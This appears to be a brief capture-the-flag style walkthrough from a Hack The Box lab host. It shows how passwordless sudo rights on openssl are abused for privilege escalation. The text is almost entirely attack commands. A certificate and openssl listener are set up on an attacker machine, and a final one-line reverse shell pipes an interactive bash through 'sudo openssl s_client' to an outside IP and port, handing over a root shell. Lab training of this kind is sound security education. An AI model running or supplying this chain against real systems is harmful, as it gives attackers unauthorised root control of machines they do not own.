# Sudo Rights Abuse

## Sudoers

```sh
htb-student@NIX02:~$ sudo -l
```

```output title="Output" hl_lines="5"
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```

## Certificate Creation

```sh
my@attack:~$ openssl req -x509 -out /tmp/cert.pem -keyout /tmp/key.pem -newkey rsa:4096 -nodes
```

## Listening

```sh
my@attack:~$ openssl s_server -quiet -cert /tmp/cert.pem -key /tmp/key.pem -port 9001
```

## Reverse Shell

```sh
htb-student@NIX02:~$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|sudo /usr/bin/openssl s_client -quiet -connect 10.10.14.235:9001 >/tmp/f
```
